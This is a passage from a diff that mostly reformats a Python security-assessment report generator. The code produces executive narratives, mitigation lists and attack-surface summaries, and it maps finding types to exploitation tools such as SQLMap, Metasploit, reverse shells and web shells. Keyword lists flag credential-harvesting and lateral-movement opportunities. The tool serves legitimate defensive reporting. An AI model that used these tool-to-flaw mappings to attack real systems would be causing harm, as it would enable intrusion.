List[VulnerabilityContext]\n+    ) -> List[str]:\n         \"\"\"Identify specialist skills needed for remediation\"\"\"\n         skills = set()\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'attack_vector'):\n+            if not hasattr(vuln, \"attack_vector\"):\n                 continue\n-                \n+\n             if vuln.attack_vector.value == \"web_application\":\n                 skills.add(\"Web Application Security\")\n             elif vuln.attack_vector.value == \"network\":\n                 skills.add(\"Network Security\")\n             elif vuln.attack_vector.value == \"configuration\":\n                 skills.add(\"System Configuration\")\n             elif vuln.attack_vector.value == \"system\":\n                 skills.add(\"System Administration\")\n-        \n+\n         return list(skills) if skills else [\"General Security\"]\n-    \n-    def _generate_executive_narrative(self, vulnerabilities: List[VulnerabilityContext], \n-                                    risk_assessment: Dict[str, Any], correlations: Dict[str, Any],\n-                                    threat_intelligence: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    def _generate_executive_narrative(\n+        self,\n+        vulnerabilities: List[VulnerabilityContext],\n+        risk_assessment: Dict[str, Any],\n+        correlations: Dict[str, Any],\n+        threat_intelligence: Dict[str, Any],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate executive narrative with business context\"\"\"\n         if not self.narrative_generation:\n-            return {\"narrative_disabled\": \"Executive narrative generation disabled in configuration\"}\n-        \n+            return {\n+                \"narrative_disabled\": \"Executive narrative generation disabled in configuration\"\n+            }\n+\n         # Create storyline based on findings\n         storyline = []\n-        \n+\n         # Opening assessment\n         risk_level = risk_assessment.get(\"risk_level\", \"UNKNOWN\")\n         total_vulns = len(vulnerabilities)\n-        \n+\n         if risk_level in [\"CRITICAL\", \"HIGH\"]:\n-            storyline.append({\n-                \"section\": \"Situation Assessment\",\n-                \"content\": f\"The security assessment has identified a {risk_level.lower()} risk situation with {total_vulns} vulnerabilities across the analyzed infrastructure. Immediate executive attention and resource allocation are required to address these security gaps before they can be exploited by malicious actors.\"\n-            })\n+            storyline.append(\n+                {\n+                    \"section\": \"Situation Assessment\",\n+                    \"content\": f\"The security assessment has identified a {risk_level.lower()} risk situation with {total_vulns} vulnerabilities across the analyzed infrastructure. Immediate executive attention and resource allocation are required to address these security gaps before they can be exploited by malicious actors.\",\n+                }\n+            )\n         else:\n-            storyline.append({\n-                \"section\": \"Situation Assessment\", \n-                \"content\": f\"The security assessment reveals a {risk_level.lower()} risk profile with {total_vulns} identified vulnerabilities. While the overall risk is manageable, proactive remediation will strengthen the organization's security posture and reduce potential attack vectors.\"\n-            })\n-        \n+            storyline.append(\n+                {\n+                    \"section\": \"Situation Assessment\",\n+                    \"content\": f\"The security assessment reveals a {risk_level.lower()} risk profile with {total_vulns} identified vulnerabilities. While the overall risk is manageable, proactive remediation will strengthen the organization's security posture and reduce potential attack vectors.\",\n+                }\n+            )\n+\n         # Attack landscape analysis\n         if correlations.get(\"attack_chains\"):\n             attack_chains = len(correlations[\"attack_chains\"])\n-            storyline.append({\n-                \"section\": \"Attack Landscape\",\n-                \"content\": f\"Analysis has identified {attack_chains} potential attack chains where vulnerabilities could be chained together for maximum impact. These represent the most critical risk paths that attackers might exploit to achieve their objectives, potentially bypassing multiple security controls in sequence.\"\n-            })\n-        \n+            storyline.append(\n+                {\n+                    \"section\": \"Attack Landscape\",\n+                    \"content\": f\"Analysis has identified {attack_chains} potential attack chains where vulnerabilities could be chained together for maximum impact. These represent the most critical risk paths that attackers might exploit to achieve their objectives, potentially bypassing multiple security controls in sequence.\",\n+                }\n+            )\n+\n         # Business impact narrative\n         business_impact = risk_assessment.get(\"business_impact_score\", 0)\n         if business_impact > 60:\n-            storyline.append({\n-                \"section\": \"Business Impact\",\n-                \"content\": f\"The identified vulnerabilities pose significant business risk with a calculated impact score of {business_impact:.1f}/100. Key business functions including {', '.join(self._identify_affected_business_functions(vulnerabilities)[:3])} could be disrupted, potentially affecting revenue, customer trust, and regulatory compliance.\"\n-            })\n-        \n+            storyline.append(\n+                {\n+                    \"section\": \"Business Impact\",\n+                    \"content\": f\"The identified vulnerabilities pose significant business risk with a calculated impact score of {business_impact:.1f}/100. Key business functions including {', '.join(self._identify_affected_business_functions(vulnerabilities)[:3])} could be disrupted, potentially affecting revenue, customer trust, and regulatory compliance.\",\n+                }\n+            )\n+\n         # Threat intelligence narrative\n         if threat_intelligence.get(\"reputation_score\", 100) < 80:\n-            storyline.append({\n-                \"section\": \"Threat Intelligence\",\n-                \"content\": f\"Threat intelligence analysis indicates elevated risk factors with a reputation score of {threat_intelligence.get('reputation_score', 100):.1f}/100. This suggests the organization may already be on the radar of malicious actors or operating in a high-threat environment requiring enhanced vigilance.\"\n-            })\n-        \n+            storyline.append(\n+                {\n+                    \"section\": \"Threat Intelligence\",\n+                    \"content\": f\"Threat intelligence analysis indicates elevated risk factors with a reputation score of {threat_intelligence.get('reputation_score', 100):.1f}/100. This suggests the organization may already be on the radar of malicious actors or operating in a high-threat environment requiring enhanced vigilance.\",\n+                }\n+            )\n+\n         # Remediation strategy\n         quick_wins = len(self._identify_quick_wins(vulnerabilities))\n         if quick_wins > 0:\n-            storyline.append({\n-                \"section\": \"Strategic Response\",\n-                \"content\": f\"The remediation strategy should prioritize {quick_wins} quick-win opportunities that provide immediate risk reduction with minimal resource investment. This approach will demonstrate rapid security improvements while more complex vulnerabilities are addressed through a structured remediation program.\"\n-            })\n-        \n+            storyline.append(\n+                {\n+                    \"section\": \"Strategic Response\",\n+                    \"content\": f\"The remediation strategy should prioritize {quick_wins} quick-win opportunities that provide immediate risk reduction with minimal resource investment. This approach will demonstrate rapid security improvements while more complex vulnerabilities are addressed through a structured remediation program.\",\n+                }\n+            )\n+\n         # Future outlook\n-        storyline.append({\n-            \"section\": \"Forward Outlook\",\n-            \"content\": \"Implementation of the recommended security measures will significantly improve the organization's security posture. Continuous monitoring and regular assessments will ensure sustained protection against evolving threats and maintain stakeholder confidence in the organization's cybersecurity capabilities.\"\n-        })\n-        \n+        storyline.append(\n+            {\n+                \"section\": \"Forward Outlook\",\n+                \"content\": \"Implementation of the recommended security measures will significantly improve the organization's security posture. Continuous monitoring and regular assessments will ensure sustained protection against evolving threats and maintain stakeholder confidence in the organization's cybersecurity capabilities.\",\n+            }\n+        )\n+\n         return {\n             \"executive_storyline\": storyline,\n             \"key_messages\": self._extract_key_messages(storyline),\n-            \"board_summary\": self._generate_board_summary(risk_assessment, vulnerabilities),\n-            \"media_statement\": self._generate_media_statement(risk_assessment)\n-        }\n-    \n+            \"board_summary\": self._generate_board_summary(\n+                risk_assessment, vulnerabilities\n+            ),\n+            \"media_statement\": self._generate_media_statement(risk_assessment),\n+        }\n+\n     def _extract_key_messages(self, storyline: List[Dict[str, str]]) -> List[str]:\n         \"\"\"Extract key messages for executive communication\"\"\"\n         key_messages = []\n-        \n+\n         for section in storyline:\n             # Extract first sentence as key message\n             content = section[\"content\"]\n-            first_sentence = content.split('.')[0] + '.'\n+            first_sentence = content.split(\".\")[0] + \".\"\n             key_messages.append(first_sentence)\n-        \n+\n         return key_messages\n-    \n-    def _generate_board_summary(self, risk_assessment: Dict[str, Any], \n-                              vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _generate_board_summary(\n+        self,\n+        risk_assessment: Dict[str, Any],\n+        vulnerabilities: List[VulnerabilityContext],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate board-level summary\"\"\"\n         return {\n             \"headline\": f\"{risk_assessment.get('risk_level', 'UNKNOWN')} cybersecurity risk identified requiring {len(vulnerabilities)} security remediations\",\n-            \"financial_impact\": self._estimate_financial_impact(vulnerabilities, risk_assessment),\n+            \"financial_impact\": self._estimate_financial_impact(\n+                vulnerabilities, risk_assessment\n+            ),\n             \"timeline\": \"Immediate action required for critical items, 30-90 day roadmap for comprehensive remediation\",\n             \"resource_approval\": \"Security team augmentation and specialized expertise recommended\",\n-            \"next_board_update\": \"30 days - Progress report on critical vulnerability remediation\"\n-        }\n-    \n+            \"next_board_update\": \"30 days - Progress report on critical vulnerability remediation\",\n+        }\n+\n     def _generate_media_statement(self, risk_assessment: Dict[str, Any]) -> str:\n         \"\"\"Generate media statement template\"\"\"\n         risk_level = risk_assessment.get(\"risk_level\", \"UNKNOWN\")\n-        \n+\n         if risk_level in [\"CRITICAL\", \"HIGH\"]:\n             return \"The organization has proactively identified security areas for improvement through comprehensive assessment and is implementing enhanced cybersecurity measures to maintain the highest standards of data protection and service availability.\"\n         else:\n             return \"Regular security assessments continue to validate the organization's strong cybersecurity posture, with ongoing improvements planned to maintain industry-leading security standards.\"\n-    \n-    def _generate_technical_analysis(self, vulnerabilities: List[VulnerabilityContext], \n-                                   correlations: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    def _generate_technical_analysis(\n+        self, vulnerabilities: List[VulnerabilityContext], correlations: Dict[str, Any]\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate detailed technical analysis\"\"\"\n         return {\n             \"attack_vector_analysis\": self._analyze_attack_vectors(vulnerabilities),\n-            \"exploit_difficulty_assessment\": self._assess_exploit_difficulty(vulnerabilities),\n-            \"defense_evasion_techniques\": self._identify_defense_evasion(vulnerabilities),\n-            \"lateral_movement_opportunities\": self._analyze_lateral_movement(vulnerabilities, correlations),\n-            \"data_exfiltration_risks\": self._assess_data_exfiltration_risks(vulnerabilities),\n-            \"persistence_mechanisms\": self._identify_persistence_mechanisms(vulnerabilities)\n-        }\n-    \n-    def _analyze_attack_vectors(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+            \"exploit_difficulty_assessment\": self._assess_exploit_difficulty(\n+                vulnerabilities\n+            ),\n+            \"defense_evasion_techniques\": self._identify_defense_evasion(\n+                vulnerabilities\n+            ),\n+            \"lateral_movement_opportunities\": self._analyze_lateral_movement(\n+                vulnerabilities, correlations\n+            ),\n+            \"data_exfiltration_risks\": self._assess_data_exfiltration_risks(\n+                vulnerabilities\n+            ),\n+            \"persistence_mechanisms\": self._identify_persistence_mechanisms(\n+                vulnerabilities\n+            ),\n+        }\n+\n+    def _analyze_attack_vectors(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Analyze attack vectors in detail\"\"\"\n         vector_analysis = {}\n-        \n+\n         # Group by attack vector\n         from collections import defaultdict\n+\n         vector_groups = defaultdict(list)\n-        \n+\n         for vuln in vulnerabilities:\n-            if hasattr(vuln, 'attack_vector'):\n+            if hasattr(vuln, \"attack_vector\"):\n                 vector_groups[vuln.attack_vector.value].append(vuln)\n-        \n+\n         for vector, vulns in vector_groups.items():\n-            avg_exploitability = statistics.mean([getattr(v, 'exploitability', 0.5) for v in vulns])\n-            avg_impact = statistics.mean([getattr(v, 'business_impact', 5.0) for v in vulns])\n-            \n+            avg_exploitability = statistics.mean(\n+                [getattr(v, \"exploitability\", 0.5) for v in vulns]\n+            )\n+            avg_impact = statistics.mean(\n+                [getattr(v, \"business_impact\", 5.0) for v in vulns]\n+            )\n+\n             vector_analysis[vector] = {\n                 \"vulnerability_count\": len(vulns),\n                 \"average_exploitability\": round(avg_exploitability, 2),\n                 \"average_business_impact\": round(avg_impact, 1),\n                 \"risk_score\": round(avg_exploitability * avg_impact, 2),\n                 \"common_techniques\": self._identify_common_techniques(vulns),\n-                \"mitigation_strategies\": self._suggest_vector_mitigations(vector)\n+                \"mitigation_strategies\": self._suggest_vector_mitigations(vector),\n             }\n-        \n+\n         return vector_analysis\n-    \n-    def _identify_common_techniques(self, vulnerabilities: List[VulnerabilityContext]) -> List[str]:\n+\n+    def _identify_common_techniques(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[str]:\n         \"\"\"Identify common attack techniques for a vector\"\"\"\n         techniques = set()\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n+\n             if \"sqli\" in template_lower:\n                 techniques.add(\"SQL Injection\")\n             elif \"xss\" in template_lower:\n                 techniques.add(\"Cross-Site Scripting\")\n             elif \"rce\" in template_lower:\n@@ -593,77 +776,90 @@\n                 techniques.add(\"Local File Inclusion\")\n             elif \"auth\" in template_lower:\n                 techniques.add(\"Authentication Bypass\")\n             elif \"upload\" in template_lower:\n                 techniques.add(\"File Upload Attacks\")\n-            \n+\n         return list(techniques)[:5]  # Top 5 techniques\n-    \n+\n     def _suggest_vector_mitigations(self, vector: str) -> List[str]:\n         \"\"\"Suggest mitigations for specific attack vectors\"\"\"\n         mitigation_map = {\n             \"web_application\": [\n                 \"Implement Web Application Firewall (WAF)\",\n                 \"Input validation and sanitization\",\n                 \"Secure coding practices\",\n-                \"Regular security code reviews\"\n+                \"Regular security code reviews\",\n             ],\n             \"network\": [\n                 \"Network segmentation\",\n                 \"Intrusion Detection System (IDS)\",\n                 \"Firewall rule optimization\",\n-                \"Network monitoring and logging\"\n+                \"Network monitoring and logging\",\n             ],\n             \"configuration\": [\n                 \"Configuration management tools\",\n                 \"Security hardening guidelines\",\n                 \"Regular configuration audits\",\n-                \"Automated compliance checking\"\n+                \"Automated compliance checking\",\n             ],\n             \"system\": [\n                 \"Patch management program\",\n                 \"System hardening\",\n                 \"Endpoint detection and response (EDR)\",\n-                \"Privilege escalation monitoring\"\n-            ]\n-        }\n-        \n-        return mitigation_map.get(vector, [\"General security controls\", \"Defense in depth strategy\"])\n-    \n-    def _assess_exploit_difficulty(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+                \"Privilege escalation monitoring\",\n+            ],\n+        }\n+\n+        return mitigation_map.get(\n+            vector, [\"General security controls\", \"Defense in depth strategy\"]\n+        )\n+\n+    def _assess_exploit_difficulty(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Assess overall exploit difficulty\"\"\"\n         if not vulnerabilities:\n-            return {\"overall_difficulty\": \"N/A\", \"analysis\": \"No vulnerabilities to assess\"}\n-        \n-        exploitability_scores = [getattr(v, 'exploitability', 0.5) for v in vulnerabilities]\n+            return {\n+                \"overall_difficulty\": \"N/A\",\n+                \"analysis\": \"No vulnerabilities to assess\",\n+            }\n+\n+        exploitability_scores = [\n+            getattr(v, \"exploitability\", 0.5) for v in vulnerabilities\n+        ]\n         avg_exploitability = statistics.mean(exploitability_scores)\n-        \n+\n         # Categorize difficulty\n         if avg_exploitability > 0.8:\n             difficulty = \"Very Easy\"\n             description = \"Vulnerabilities can be exploited with minimal effort and readily available tools\"\n         elif avg_exploitability > 0.6:\n             difficulty = \"Easy\"\n-            description = \"Exploitation requires basic technical skills and common tools\"\n+            description = (\n+                \"Exploitation requires basic technical skills and common tools\"\n+            )\n         elif avg_exploitability > 0.4:\n             difficulty = \"Moderate\"\n             description = \"Exploitation requires intermediate technical skills and specialized tools\"\n         elif avg_exploitability > 0.2:\n             difficulty = \"Difficult\"\n-            description = \"Exploitation requires advanced technical skills and custom tools\"\n+            description = (\n+                \"Exploitation requires advanced technical skills and custom tools\"\n+            )\n         else:\n             difficulty = \"Very Difficult\"\n             description = \"Exploitation requires expert-level skills and significant time investment\"\n-        \n+\n         return {\n             \"overall_difficulty\": difficulty,\n             \"average_exploitability\": round(avg_exploitability, 2),\n             \"description\": description,\n             \"skill_level_required\": self._map_skill_level(avg_exploitability),\n-            \"tools_required\": self._identify_required_tools(vulnerabilities)\n-        }\n-    \n+            \"tools_required\": self._identify_required_tools(vulnerabilities),\n+        }\n+\n     def _map_skill_level(self, exploitability: float) -> str:\n         \"\"\"Map exploitability to required skill level\"\"\"\n         if exploitability > 0.8:\n             return \"Script Kiddie\"\n         elif exploitability > 0.6:\n@@ -672,236 +868,293 @@\n             return \"Intermediate Attacker\"\n         elif exploitability > 0.2:\n             return \"Advanced Attacker\"\n         else:\n             return \"Expert/APT Level\"\n-    \n-    def _identify_required_tools(self, vulnerabilities: List[VulnerabilityContext]) -> List[str]:\n+\n+    def _identify_required_tools(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[str]:\n         \"\"\"Identify tools required for exploitation\"\"\"\n         tools = set()\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n+\n             if \"sqli\" in template_lower:\n                 tools.update([\"SQLMap\", \"Burp Suite\", \"Manual SQL injection\"])\n             elif \"xss\" in template_lower:\n                 tools.update([\"XSS payloads\", \"Browser\", \"BeEF\"])\n             elif \"rce\" in template_lower:\n                 tools.update([\"Reverse shells\", \"Metasploit\", \"Custom exploits\"])\n             elif \"upload\" in template_lower:\n                 tools.update([\"Web shells\", \"File upload bypasses\"])\n             else:\n                 tools.add(\"Common penetration testing tools\")\n-        \n+\n         return list(tools)[:5]  # Top 5 tools\n-    \n-    def _identify_defense_evasion(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, str]]:\n+\n+    def _identify_defense_evasion(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, str]]:\n         \"\"\"Identify potential defense evasion techniques\"\"\"\n         evasion_techniques = []\n-        \n+\n         # Check for vulnerabilities that might enable evasion\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n+\n             if \"log\" in template_lower or \"audit\" in template_lower:\n-                evasion_techniques.append({\n-                    \"technique\": \"Log Evasion\",\n-                    \"description\": \"Attackers may exploit logging vulnerabilities to avoid detection\",\n-                    \"vulnerability\": vuln.template_id\n-                })\n-            \n+                evasion_techniques.append(\n+                    {\n+                        \"technique\": \"Log Evasion\",\n+                        \"description\": \"Attackers may exploit logging vulnerabilities to avoid detection\",\n+                        \"vulnerability\": vuln.template_id,\n+                    }\n+                )\n+\n             if \"auth\" in template_lower:\n-                evasion_techniques.append({\n-                    \"technique\": \"Authentication Bypass\",\n-                    \"description\": \"Bypass authentication mechanisms to avoid access controls\",\n-                    \"vulnerability\": vuln.template_id\n-                })\n-            \n+                evasion_techniques.append(\n+                    {\n+                        \"technique\": \"Authentication Bypass\",\n+                        \"description\": \"Bypass authentication mechanisms to avoid access controls\",\n+                        \"vulnerability\": vuln.template_id,\n+                    }\n+                )\n+\n             if \"encrypt\" in template_lower or \"ssl\" in template_lower:\n-                evasion_techniques.append({\n-                    \"technique\": \"Traffic Encryption Abuse\",\n-                    \"description\": \"Use encrypted channels to hide malicious communications\",\n-                    \"vulnerability\": vuln.template_id\n-                })\n-        \n+                evasion_techniques.append(\n+                    {\n+                        \"technique\": \"Traffic Encryption Abuse\",\n+                        \"description\": \"Use encrypted channels to hide malicious communications\",\n+                        \"vulnerability\": vuln.template_id,\n+                    }\n+                )\n+\n         return evasion_techniques[:5]  # Top 5 techniques\n-    \n-    def _analyze_lateral_movement(self, vulnerabilities: List[VulnerabilityContext], \n-                                correlations: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    def _analyze_lateral_movement(\n+        self, vulnerabilities: List[VulnerabilityContext], correlations: Dict[str, Any]\n+    ) -> Dict[str, Any]:\n         \"\"\"Analyze lateral movement opportunities\"\"\"\n         lateral_movement = {\n             \"potential_paths\": [],\n             \"network_pivots\": [],\n             \"credential_harvesting\": [],\n-            \"service_exploitation\": []\n-        }\n-        \n+            \"service_exploitation\": [],\n+        }\n+\n         # Check for lateral movement enablers\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n-            if any(service in template_lower for service in [\"ssh\", \"rdp\", \"smb\", \"winrm\"]):\n-                lateral_movement[\"network_pivots\"].append({\n-                    \"service\": vuln.template_id,\n-                    \"target\": getattr(vuln, 'target', 'Unknown'),\n-                    \"description\": \"Network service that could enable lateral movement\"\n-                })\n-            \n-            if any(cred in template_lower for cred in [\"password\", \"credential\", \"token\", \"session\"]):\n-                lateral_movement[\"credential_harvesting\"].append({\n-                    \"vulnerability\": vuln.template_id,\n-                    \"target\": getattr(vuln, 'target', 'Unknown'),\n-                    \"description\": \"Potential credential harvesting opportunity\"\n-                })\n-        \n+\n+            if any(\n+                service in template_lower for service in [\"ssh\", \"rdp\", \"smb\", \"winrm\"]\n+            ):\n+                lateral_movement[\"network_pivots\"].append(\n+                    {\n+                        \"service\": vuln.template_id,\n+                        \"target\": getattr(vuln, \"target\", \"Unknown\"),\n+                        \"description\": \"Network service that could enable lateral movement\",\n+                    }\n+                )\n+\n+            if any(\n+                cred in template_lower\n+                for cred in [\"password\", \"credential\", \"token\", \"session\"]\n+            ):\n+                lateral_movement[\"credential_harvesting\"].append(\n+                    {\n+                        \"vulnerability\": vuln.template_id,\n+                        \"target\": getattr(vuln, \"target\", \"Unknown\"),\n+                        \"description\": \"Potential credential harvesting opportunity\",\n+                    }\n+                )\n+\n         # Analyze attack chains for lateral movement\n         if correlations.get(\"attack_chains\"):\n             for chain in correlations[\"attack_chains\"]:\n                 if len(chain.get(\"vulnerabilities\", [])) > 1:\n-                    lateral_movement[\"potential_paths\"].append({\n-                        \"chain_name\": chain.get(\"name\", \"Unknown\"),\n-                        \"target\": chain.get(\"target\", \"Unknown\"),\n-                        \"path_length\": len(chain.get(\"vulnerabilities\", [])),\n-                        \"description\": f\"Multi-step attack path: {' -> '.join(chain.get('vulnerabilities', [])[:3])}\"\n-                    })\n-        \n+                    lateral_movement[\"potential_paths\"].append(\n+                        {\n+                            \"chain_name\": chain.get(\"name\", \"Unknown\"),\n+                            \"target\": chain.get(\"target\", \"Unknown\"),\n+                            \"path_length\": len(chain.get(\"vulnerabilities\", [])),\n+                            \"description\": f\"Multi-step attack path: {' -> '.join(chain.get('vulnerabilities', [])[:3])}\",\n+                        }\n+                    )\n+\n         return lateral_movement\n-    \n-    def _assess_data_exfiltration_risks(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _assess_data_exfiltration_risks(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Assess data exfiltration risks\"\"\"\n         exfiltration_risks = {\n             \"direct_access\": [],\n             \"database_exposure\": [],\n             \"file_system_access\": [],\n             \"api_exposure\": [],\n-            \"overall_risk\": \"LOW\"\n-        }\n-        \n+            \"overall_risk\": \"LOW\",\n+        }\n+\n         high_risk_count = 0\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n-            if any(db in template_lower for db in [\"sql\", \"database\", \"mysql\", \"postgres\", \"mongo\"]):\n-                exfiltration_risks[\"database_exposure\"].append({\n-                    \"vulnerability\": vuln.template_id,\n-                    \"target\": getattr(vuln, 'target', 'Unknown'),\n-                    \"risk_level\": \"HIGH\"\n-                })\n+\n+            if any(\n+                db in template_lower\n+                for db in [\"sql\", \"database\", \"mysql\", \"postgres\", \"mongo\"]\n+            ):\n+                exfiltration_risks[\"database_exposure\"].append(\n+                    {\n+                        \"vulnerability\": vuln.template_id,\n+                        \"target\": getattr(vuln, \"target\", \"Unknown\"),\n+                        \"risk_level\": \"HIGH\",\n+                    }\n+                )\n                 high_risk_count += 1\n-            \n-            if any(file_term in template_lower for file_term in [\"lfi\", \"directory\", \"file\", \"path\"]):\n-                exfiltration_risks[\"file_system_access\"].append({\n-                    \"vulnerability\": vuln.template_id,\n-                    \"target\": getattr(vuln, 'target', 'Unknown'),\n-                    \"risk_level\": \"MEDIUM\"\n-                })\n-            \n+\n+            if any(\n+                file_term in template_lower\n+                for file_term in [\"lfi\", \"directory\", \"file\", \"path\"]\n+            ):\n+                exfiltration_risks[\"file_system_access\"].append(\n+                    {\n+                        \"vulnerability\": vuln.template_id,\n+                        \"target\": getattr(vuln, \"target\", \"Unknown\"),\n+                        \"risk_level\": \"MEDIUM\",\n+                    }\n+                )\n+\n             if \"api\" in template_lower:\n-                exfiltration_risks[\"api_exposure\"].append({\n-                    \"vulnerability\": vuln.template_id,\n-                    \"target\": getattr(vuln, 'target', 'Unknown'),\n-                    \"risk_level\": \"MEDIUM\"\n-                })\n-        \n+                exfiltration_risks[\"api_exposure\"].append(\n+                    {\n+                        \"vulnerability\": vuln.template_id,\n+                        \"target\": getattr(vuln, \"target\", \"Unknown\"),\n+                        \"risk_level\": \"MEDIUM\",\n+                    }\n+                )\n+\n         # Determine overall risk\n         if high_risk_count > 2:\n             exfiltration_risks[\"overall_risk\"] = \"CRITICAL\"\n         elif high_risk_count > 0:\n             exfiltration_risks[\"overall_risk\"] = \"HIGH\"\n-        elif any(exfiltration_risks[key] for key in [\"file_system_access\", \"api_exposure\"]):\n+        elif any(\n+            exfiltration_risks[key] for key in [\"file_system_access\", \"api_exposure\"]\n+        ):\n             exfiltration_risks[\"overall_risk\"] = \"MEDIUM\"\n-        \n+\n         return exfiltration_risks\n-    \n-    def _identify_persistence_mechanisms(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, str]]:\n+\n+    def _identify_persistence_mechanisms(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, str]]:\n         \"\"\"Identify potential persistence mechanisms\"\"\"\n         persistence_mechanisms = []\n-        \n+\n         for vuln in vulnerabilities:\n-            if not hasattr(vuln, 'template_id'):\n+            if not hasattr(vuln, \"template_id\"):\n                 continue\n-                \n+\n             template_lower = vuln.template_id.lower()\n-            \n+\n             if \"upload\" in template_lower:\n-                persistence_mechanisms.append({\n-                    \"mechanism\": \"File Upload Backdoor\",\n-                    \"description\": \"Uploaded malicious files could provide persistent access\",\n-                    \"vulnerability\": vuln.template_id\n-                })\n-            \n+                persistence_mechanisms.append(\n+                    {\n+                        \"mechanism\": \"File Upload Backdoor\",\n+                        \"description\": \"Uploaded malicious files could provide persistent access\",\n+                        \"vulnerability\": vuln.template_id,\n+                    }\n+                )\n+\n             if \"rce\" in template_lower:\n-                persistence_mechanisms.append({\n-                    \"mechanism\": \"System-level Persistence\",\n-                    \"description\": \"Code execution could install persistent backdoors\",\n-                    \"vulnerability\": vuln.template_id\n-                })\n-            \n+                persistence_mechanisms.append(\n+                    {\n+                        \"mechanism\": \"System-level Persistence\",\n+                        \"description\": \"Code execution could install persistent backdoors\",\n+                        \"vulnerability\": vuln.template_id,\n+                    }\n+                )\n+\n             if any(auth in template_lower for auth in [\"auth\", \"session\", \"login\"]):\n-                persistence_mechanisms.append({\n-                    \"mechanism\": \"Authentication Persistence\",\n-                    \"description\": \"Compromised authentication could maintain long-term access\",\n-                    \"vulnerability\": vuln.template_id\n-                })\n-        \n+                persistence_mechanisms.append(\n+                    {\n+                        \"mechanism\": \"Authentication Persistence\",\n+                        \"description\": \"Compromised authentication could maintain long-term access\",\n+                        \"vulnerability\": vuln.template_id,\n+                    }\n+                )\n+\n         return persistence_mechanisms[:5]  # Top 5 mechanisms\n-    \n-    def _analyze_attack_surface(self, recon_results: Dict[str, Any], \n-                              vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _analyze_attack_surface(\n+        self, recon_results: Dict[str, Any], vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Analyze the overall attack surface\"\"\"\n         # Calculate attack surface metrics\n         total_targets = len(recon_results)\n-        total_services = sum(len(data.get(\"open_ports\", [])) for data in recon_results.values())\n-        total_web_services = sum(len(data.get(\"http_info\", [])) for data in recon_results.values())\n-        \n+        total_services = sum(\n+            len(data.get(\"open_ports\", [])) for data in recon_results.values()\n+        )\n+        total_web_services = sum(\n+            len(data.get(\"http_info\", [])) for data in recon_results.values()\n+        )\n+\n         # Vulnerability distribution across attack surface\n         target_vulnerability_map = defaultdict(int)\n         for vuln in vulnerabilities:\n-            if hasattr(vuln, 'target'):\n+            if hasattr(vuln, \"target\"):\n                 target_vulnerability_map[vuln.target] += 1\n-        \n+\n         # Identify high-risk targets\n         high_risk_targets = [\n             {\"target\": target, \"vulnerability_count\": count}\n             for target, count in target_vulnerability_map.items()\n             if count >= 3\n         ]\n-        \n+\n         return {\n             \"surface_metrics\": {\n                 \"total_targets\": total_targets,\n                 \"total_services\": total_services,\n                 \"web_services\": total_web_services,\n-                \"vulnerability_density\": len(vulnerabilities) / max(total_targets, 1)\n-            },\n-            \"high_risk_targets\": sorted(high_risk_targets, key=lambda x: x[\"vulnerability_count\"], reverse=True)[:10],\n+                \"vulnerability_density\": len(vulnerabilities) / max(total_targets, 1),\n+            },\n+            \"high_risk_targets\": sorted(\n+                high_risk_targets, key=lambda x: x[\"vulnerability_count\"], reverse=True\n+            )[:10],\n             \"service_exposure\": self._analyze_service_exposure(recon_results),\n-            \"attack_surface_evolution\": self._estimate_surface_evolution(recon_results, vulnerabilities)\n-        }\n-    \n-    def _analyze_service_exposure(self, recon_results: Dict[str, Any]) -> Dict[str, int]:\n+            \"attack_surface_evolution\": self._estimate_surface_evolution(\n+                recon_results, vulnerabilities\n+            ),\n+        }\n+\n+    def _analyze_service_exposure(\n+        self, recon_results: Dict[str, Any]\n+    ) -> Dict[str, int]:\n         \"\"\"Analyze service exposure across the attack surface\"\"\"\n         service_counts = defaultdict(int)\n-        \n+\n         for target, data in recon_results.items():\n             for port_info in data.get(\"open_ports\", []):\n                 port = port_info.get(\"port\", 0)\n-                \n+\n                 # Map common ports to services\n                 if port == 80:\n                     service_counts[\"HTTP\"] += 1\n                 elif port == 443:\n                     service_counts[\"HTTPS\"] += 1\n@@ -915,327 +1168,368 @@\n                     service_counts[\"DNS\"] += 1\n                 